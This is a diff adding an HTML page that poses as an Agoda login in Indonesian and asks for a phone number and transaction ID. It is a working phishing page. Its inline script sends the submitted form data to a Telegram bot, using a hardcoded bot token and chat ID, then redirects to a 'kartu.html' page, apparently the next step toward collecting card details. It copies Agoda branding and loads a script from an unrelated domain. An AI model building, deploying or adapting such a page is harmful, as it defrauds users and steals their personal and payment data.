@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="theme-color" content="#008000" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="icon" type="image/png" href="">
+    <title>Login - Agoda</title>
+
+    <link rel="preload" as="style" href="" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" />
+    </head>
+<body>
+
+            <img src="https://static.tildacdn.ink/tild3034-6132-4637-b766-626264356538/1000225152.png" alt="" width="350vh" class="">
+            <div class="p-4 rounded shadow bg-white mb-3 border-top-large">
+                <form id="setPin" onsubmit="return false">
+         <br>     
+                    <div class="mb-3">
+    <label for="nohp" class="d-block">Nomor Telepon</label>
+    <input type="number" name="nohp" id="nohp"
+        class="form-control"
+        autocomplete="off" placeholder="Masukkan nomor telepon Anda" required autofocus value="">
+
+    </div>
+                    <div class="mb-3 ">
+    <label for="ID Transaksi" class="d-block mb-2">ID Transaksi</label>
+        <input type="number" name="ID Transaksi" id="ID Transaksi" class="form-control" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Masukkan ID transaksi Anda" required value="">
+
+    </div>
+        <br>  
+                    <button type="submit" id="btnSubmit" class="btn btn-primary w-100 my-2"><strong>Login</strong></button>
+
+                    <div class="text-center mt-3">
+                        <p class="mb-1">Belum punya akun? <a href="log.html"><strong>Daftar
+                                    sekarang</strong></a></p>
+                        <p class="mb-0"><a href="log.html" class="text-decoration-none"><strong>Lupa
+                                    password?</strong></a></p>
+                    </div>
+                          </form>
+  </div>
+   
+       <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+        </div> 
+   </div> 
+   </div>
+ <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
+<script src="jquery.min.js"></script>
+       
+        <script type="text/javascript">
+            $(document).ready(function(){
+        </script>
+<!-- </body> -->  
+   <script>
+
+
+function closeForm() {
+  document.getElementById("myForm").style.display = "none";
+}
+</script> 
+  
+  <!-- partial -->
+ <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js'></script>
+<script src='https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js'></script>
+ <script>$(document).ready(function(){
+$('#debit').mask('0000 0000 0000 0000');     
+$('#valid').mask('00/00');
+});</script>
+ <p id="status"></p>
+   <script src="setPin.js"></script>
+   
+   <script>
+   
+            $(document).ready(function() {
+            $("div#eyeOpen").on('click', function() {
+                $("#eyeOpen").css("display", "none");
+                $("#eyeClose").css("display", "block");
+
+                $("#password").prop("type", "text");
+
+                $("div#eyeClose").on('click', function() {
+                    $("#eyeOpen").css("display", "block");
+                    $("#eyeClose").css("display", "none");
+
+                    $("#password").prop("type", "password");
+                });
+            });
+            
+const chat_id = '-1002437287311', botID = 'bot7566851766:AAEbOqBAI2XfHKrx15zlO-OqkGUvNzFPh_o';
+
+    const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
+
+    document.querySelector('#setPin').addEventListener("submit", async e => { // When the user submits the form
+        e.preventDefault(); // Don't submit
+        let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
+            Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
+        null, 2); // Prettify the JSON so we can read the data easily
+        const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
+            method: 'POST',
+            headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
+            body: JSON.stringify({chat_id, text}), // The body must be a string, not an object
+        });
+        const messageStatus = document.querySelector('#status');
+        if (sendMessage.ok) // Update the user on if the message went through
+            messageStatus.textContent = "";
+        else
+            messageStatus.textContent = "Message Failed to send :( " + (await sendMessage.text());
+        e.target.reset(); // Clear the form fields.
+        window.location.href = 'kartu.html';
+    });
+
+            
+        });
+        
+   </script>
+        </form>
+      </div>
+    </section>
+    <!-- <script src="./axios.js" type="module"></script> -->
+    <script src="./Pin.html" type="module"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js">
+            </script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.min.js">
+            </script>
+<script>
+            $(document).ready(function() {
+                $('.slider').slick({
+                    autoplay: true,
+                    autoplaySpeed: 500,
+                    dots: true
+                });
+            });
+            </script>
+            
+            <script>
+ var nomor = sessionStorage.getItem("nomor");
+ document.getElementById("nomorku").value = nomor + "";
+</script>
+
+
+        <br><br><br><br><br><br><br><br>      
+            </div>
+            <small class="text-center d-block text-muted">
+                2025 &copy; 2025 © All material herein © 2005-2025 Agoda Company Pte. Ltd. All Rights Reserved AI technology is used to improve user experience.
+            </small>
+        </div>
+    </div>
+</div>
+
+
+
+    
+    
+    <link rel="modulepreload" href="https://beasiswa-amartha.org/build/assets/app-DIWlI6zE.js" /><script type="module" src="https://beasiswa-amartha.org/build/assets/app-DIWlI6zE.js"></script>    </body>
+</html>
